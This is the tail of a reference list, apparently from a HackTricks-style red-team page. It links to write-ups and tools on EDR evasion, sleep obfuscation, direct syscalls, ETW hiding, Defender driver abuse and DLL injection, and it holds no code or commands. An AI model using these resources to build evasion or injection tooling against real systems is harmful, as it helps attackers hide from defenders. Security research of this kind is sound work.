- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abusing thread pool internals for shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)

{{#include ../banners/hacktricks-training.md}}
